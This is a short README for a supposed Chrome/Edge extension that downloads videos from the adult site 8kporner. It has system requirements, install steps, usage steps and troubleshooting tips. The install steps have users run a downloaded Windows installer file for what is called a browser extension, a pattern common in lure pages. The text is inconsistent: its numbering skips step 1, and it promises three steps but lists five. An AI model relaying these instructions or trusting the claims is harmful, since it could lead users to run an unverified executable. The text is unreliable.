## 📌 About this project

This extension allows users to save videos from 8kporner to a local drive. You can watch your favorite content without an internet connection. The tool captures video streams directly from your web browser. It maintains the original file quality. You do not need technical skills to use this software. 

## ⚙️ System requirements

Ensure your computer meets these conditions before you install the tool:

*   Operating System: Windows 10 or Windows 11
*   Web Browser: Google Chrome or Microsoft Edge
*   Disk Space: At least 200 MB of free storage
*   Memory: 4 GB of RAM or more

## 📥 Installing the extension

Follow these steps to set up the software on your Windows computer:

2. Locate the latest version button on the right side of the screen.
3. Click the link to save the installation file to your computer.
4. Open your downloads folder.
5. Double-click the installer file.
6. Follow the instructions on the screen to finish the setup process.
7. Restart your web browser to activate the features.

## 🚀 How to use the downloader

Once you install the software, you can save videos in three simple steps:

1. Open your web browser.
2. Navigate to the 8kporner video page you want to save.
3. Look for the download button attached to the video player.
4. Click the button to start the transfer.
5. Select a folder on your computer to store the file.

The software begins the process immediately. You can track the progress in the status bar at the top of your browser window.

## 🛠 Troubleshooting common issues

If you face problems, check these items:

*   **Button not visible:** Refresh your web page. Sometimes the script needs a second load to detect the video stream.
*   **Download failure:** Ensure your internet connection remains stable during the process.
*   **File location:** Check your "Downloads" folder if you cannot find the saved video.
*   **Update browser:** Use the latest version of Chrome or Edge for the best results.
